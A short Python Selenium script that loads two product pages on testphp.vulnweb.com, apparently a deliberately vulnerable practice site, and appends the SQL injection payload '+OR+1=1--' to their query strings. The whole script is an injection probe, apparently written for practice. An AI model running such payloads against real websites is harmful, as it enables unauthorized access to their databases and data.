from selenium import webdriver
from time import sleep

url1 = "http://testphp.vulnweb.com/listproducts.php?cat=1"
url2 = "http://testphp.vulnweb.com/listproducts.php?artist=2"
driver = webdriver.Chrome('/Applications/chromedriver')
payload = "+OR+1=1--"

driver.get(url1)
sleep(2)
url1 =  driver.current_url + payload
driver.get(url1)
sleep(5)

driver.get(url2)
sleep(2)
url2 =  driver.current_url + payload
driver.get(url2)
sleep(5)
driver.quit()